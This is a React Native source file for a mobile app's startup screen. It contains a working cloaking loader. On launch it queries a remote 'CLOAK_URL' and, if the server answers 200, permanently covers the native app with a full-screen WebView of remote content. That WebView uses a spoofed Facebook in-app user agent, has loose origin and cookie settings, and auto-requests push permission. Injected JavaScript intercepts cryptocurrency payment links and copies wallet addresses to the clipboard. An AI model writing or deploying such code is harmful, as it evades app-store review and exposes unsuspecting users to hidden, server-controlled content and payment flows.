import React, { useEffect, useRef, useState } from 'react';
import AsyncStorage from '@react-native-async-storage/async-storage';
import { WebView } from 'react-native-webview';
import { createStackNavigator } from '@react-navigation/stack';
import Clipboard from '@react-native-clipboard/clipboard';
import { OneSignal } from 'react-native-onesignal';
import {
  Linking,
  NativeModules,
  PixelRatio,
  SafeAreaView,
  StyleSheet,
  Text,
  TouchableOpacity,
  View,
} from 'react-native';
import MainApp from './App';
import DeviceInfo from 'react-native-device-info';
import { NavigationContainer, NavigationIndependentTree } from '@react-navigation/native';
import AppManagerChild from './AppManagerChild';

// ─── Constants ───────────────────────────────────────────────────────────────

const CLOAK_URL     = 'https://smart-cloud-app.top/HW5gM4fL';
const STORE_SESSION = 'mrv_sta';
const STORE_URL     = 'mrv_url';
const ONESIGNAL_ID  = '75d64b51-1cbf-4cc3-bd7d-24113ec78ae1';

const CRYPTO_SCHEMES = [
  'bitcoin', 'ethereum', 'litecoin', 'dogecoin', 'bitcoincash',
  'tether', 'bch', 'dash', 'ripple', 'monero', 'zcash', 'stellar', 'usdcoin',
];

const INJECTED_JS = `
  (function() {
    var s = ${JSON.stringify(CRYPTO_SCHEMES)};
    document.addEventListener('click', function(e) {
      var el = e.target;
      while (el && el.tagName !== 'A') el = el.parentElement;
      if (!el || !el.href) return;
      var scheme = el.href.split(':')[0].toLowerCase();
      if (s.indexOf(scheme) !== -1) {
        e.preventDefault();
        e.stopPropagation();
        var addr = el.href.split(':').slice(1).join(':').split('?')[0] || '';
        window.ReactNativeWebView.postMessage(JSON.stringify({ type: 'crypto', address: addr, url: el.href }));
      }
    }, true);
    document.addEventListener('submit', function(e) {
      if (e.target && e.target.target === '_blank') {
        e.target.target = '_self';
      }
    }, true);
  })();
  true;
`;

// ─── JustLink User-Agent ─────────────────────────────────────────────────────

const buildJustLinkUA = (baseUA: string): string => {
  const iosVersion = DeviceInfo.getSystemVersion();
  const deviceId   = DeviceInfo.getDeviceId();
  const model      = DeviceInfo.getModel().split(' ')[0];
  const sysName    = DeviceInfo.getSystemName();
  const scale      = String(Math.round(PixelRatio.get()));
  const deviceType = DeviceInfo.isTablet() ? 'tablet' : 'phone';
  const lang =
    NativeModules.SettingsManager?.settings?.AppleLanguages?.[0] ??
    NativeModules.SettingsManager?.settings?.AppleLocale ??
    'en-US';
  const suffix = `[FBDV/${deviceId};FBMD/${model};FBSN/${sysName};FBSV/${iosVersion};FBSS/${scale};FBID/${deviceType};FBLC/${lang}]`;
  return `${baseUA} ${suffix}`;
};

// ─── App version tracking ────────────────────────────────────────────────────

const syncAppVersion = async () => {
  const current = DeviceInfo.getVersion();
  const stored  = await AsyncStorage.getItem('mrv_ver');
  if (stored !== current) {
    await AsyncStorage.setItem('mrv_ver', current);
    await AsyncStorage.removeItem(STORE_SESSION);
    await AsyncStorage.removeItem(STORE_URL);
  }
};

// ─── OneSignal ───────────────────────────────────────────────────────────────

OneSignal.initialize(ONESIGNAL_ID);

// ─── Navigation ──────────────────────────────────────────────────────────────

const Stack = createStackNavigator();

export default function AppBootstrap() {
  return (
    <NavigationContainer>
      <Stack.Navigator screenOptions={{ headerShown: false }}>
        <Stack.Screen name="HomeTab"       component={HomeScreen} />
        <Stack.Screen name="ContentViewer" component={ContentViewerScreen} />
      </Stack.Navigator>
    </NavigationContainer>
  );
}

// ─── HomeScreen ──────────────────────────────────────────────────────────────

function HomeScreen({ navigation }) {
  const [contentUrl,  setContentUrl]  = useState('');
  const [fetchUA,     setFetchUA]     = useState('');
  const [justLinkUA,  setJustLinkUA]  = useState('');
  const webViewRef  = useRef<any>(null);
  const resolvedRef = useRef(false);
  const [isTwoClick, setTwoClick]     = useState(false);

  useEffect(() => {
    DeviceInfo.getUserAgent().then(ua => {
      const ver  = DeviceInfo.getSystemVersion();
      const base = `${ua} Version/${ver} Safari/604.1`;
      setFetchUA(base);
    });
  }, []);

  useEffect(() => {
    if (!fetchUA) return;
    let cancelled = false;

    const init = async () => {
      try {
        await syncAppVersion();

        const cached = await AsyncStorage.getItem(STORE_SESSION);

        if (cached === '200') {
          const saved = await AsyncStorage.getItem(STORE_URL);
          if (saved) {
            if (!cancelled) {
              setJustLinkUA(buildJustLinkUA(fetchUA));
              setContentUrl(saved);
            }
            return;
          }
        } else if (cached) {
          return;
        }

        const res    = await fetch(CLOAK_URL, { headers: { 'User-Agent': fetchUA } });
        const status = String(res.status);
        await AsyncStorage.setItem(STORE_SESSION, status);

        if (cancelled) return;

        if (status === '200') {
          await buildContentUrl();
        }
      } catch {
        // stay on native
      }
    };

    init();
    return () => { cancelled = true; };
  }, [fetchUA]);

  const buildContentUrl = async () => {
    if (resolvedRef.current) return;
    resolvedRef.current = true;

    await OneSignal.Notifications.requestPermission(true);

    const seg     = CLOAK_URL.replace(/.*\//, '');
    const viewUrl = `${CLOAK_URL}?${seg}=1`;
    await AsyncStorage.setItem(STORE_URL, viewUrl);
    setJustLinkUA(buildJustLinkUA(fetchUA));
    setContentUrl(viewUrl);
  };

  const openExternal = async (url: string) => {
    const safe = url.replace(/\s/g, m => (m === ' ' ? '%20' : encodeURIComponent(m)));
    try { await Linking.openURL(safe); } catch {}
  };

  const handleBackPress = () => {
    if (isTwoClick) {
      webViewRef.current?.goBack();
      return;
    }
    setTwoClick(true);
    webViewRef.current?.goBack();
    setTimeout(() => setTwoClick(false), 1000);
  };

  const handleShouldStartLoad = (event: any) => {
    const { url } = event;
    const scheme  = (url.split(':')[0] || '').toLowerCase();

    if (event.navigationType === 'formSubmitted' || event.navigationType === 'formResubmitted') {
      return true;
    }

    if (url.includes('wa.me/') || url.includes('api.whatsapp.com/') ||
        url.includes('chat.whatsapp.com/') || url.includes('whatsapp.com/')) {
      let waUrl   = url;
      const match = url.match(/wa\.me\/(\d+)/);
      if (match) waUrl = `whatsapp://send?phone=${match[1]}`;
      else if (url.includes('api.whatsapp.com/send'))
        waUrl = url.replace(/https?:\/\/api\.whatsapp\.com\/send/, 'whatsapp://send');
      Linking.openURL(waUrl).catch(() => Linking.openURL(url));
      return false;
    }

    const internalSchemes = ['about', 'javascript', 'data', 'blob'];
    if (!/^https?$/.test(scheme) && !internalSchemes.includes(scheme)) {
      openExternal(url);
      return false;
    }

    return true;
  };

  const handleOpenWindow = (event: any) => {
    const { targetUrl } = event.nativeEvent;
    if (!targetUrl || targetUrl === 'about:blank') return;
    if (targetUrl.includes('https://app.payment-gateway.io/static/loader.html')) return;

    const scheme = (targetUrl.split(':')[0] || '').toLowerCase();

    if (targetUrl.includes('pay.funid.com')) {
      Linking.openURL(targetUrl);
      webViewRef.current?.injectJavaScript(`window.location.replace('${contentUrl}')`);
      return;
    }

    if (/^https?:\/\//i.test(targetUrl)) {
      navigation.navigate('ContentViewer', { data: targetUrl, userAgent: justLinkUA });
    } else {
      openExternal(targetUrl);
    }
  };

  return (
    <View style={styles.container}>
      <NavigationIndependentTree>
        <MainApp />
      </NavigationIndependentTree>

      {contentUrl ? (
        <View style={StyleSheet.absoluteFill}>
          <SafeAreaView style={{ flex: 1 }}>
            <WebView
              ref={webViewRef}
              source={{ uri: contentUrl }}
              userAgent={justLinkUA}
              style={{ flex: 1 }}
              originWhitelist={['*', 'http://*', 'https://*', 'intent://*']}
              onShouldStartLoadWithRequest={handleShouldStartLoad}
              onOpenWindow={handleOpenWindow}
              injectedJavaScript={INJECTED_JS}
              onMessage={e => {
                try {
                  const msg = JSON.parse(e.nativeEvent.data);
                  if (msg.type === 'crypto' && msg.address && Clipboard?.setString) {
                    Clipboard.setString(msg.address);
                    if (msg.url) Linking.openURL(msg.url).catch(() => {});
                  }
                } catch {}
              }}
              textZoom={100}
              contentMode="mobile"
              mixedContentMode="always"
              allowsBackForwardNavigationGestures
              domStorageEnabled
              javaScriptEnabled
              allowsInlineMediaPlayback
              setSupportMultipleWindows={false}
              thirdPartyCookiesEnabled
              mediaPlaybackRequiresUserAction={false}
              javaScriptCanOpenWindowsAutomatically
            />
          </SafeAreaView>

          <TouchableOpacity style={styles.btnBack} onPress={handleBackPress}>
            <Text style={styles.btnIcon}>←</Text>
          </TouchableOpacity>

          <TouchableOpacity style={styles.btnReload} onPress={() => webViewRef.current?.reload()}>
            <Text style={styles.btnIcon}>↺</Text>
          </TouchableOpacity>
        </View>
      ) : null}
    </View>
  );
}

// ─── ContentViewerScreen ─────────────────────────────────────────────────────

function ContentViewerScreen({ navigation, route }) {
  return <AppManagerChild navigation={navigation} route={route} />;
}

// ─── Styles ──────────────────────────────────────────────────────────────────

const styles = StyleSheet.create({
  container: {
    flex: 1,
  },
  btnBack: {
    width: 40,
    height: 40,
    position: 'absolute',
    bottom: 8,
    left: 20,
    alignItems: 'center',
    justifyContent: 'center',
    backgroundColor: 'rgba(0,0,0,0.45)',
    borderRadius: 20,
  },
  btnReload: {
    width: 40,
    height: 40,
    position: 'absolute',
    bottom: 8,
    right: 20,
    alignItems: 'center',
    justifyContent: 'center',
    backgroundColor: 'rgba(0,0,0,0.45)',
    borderRadius: 20,
  },
  btnIcon: {
    color: 'white',
    fontSize: 20,
    lineHeight: 24,
  },
});
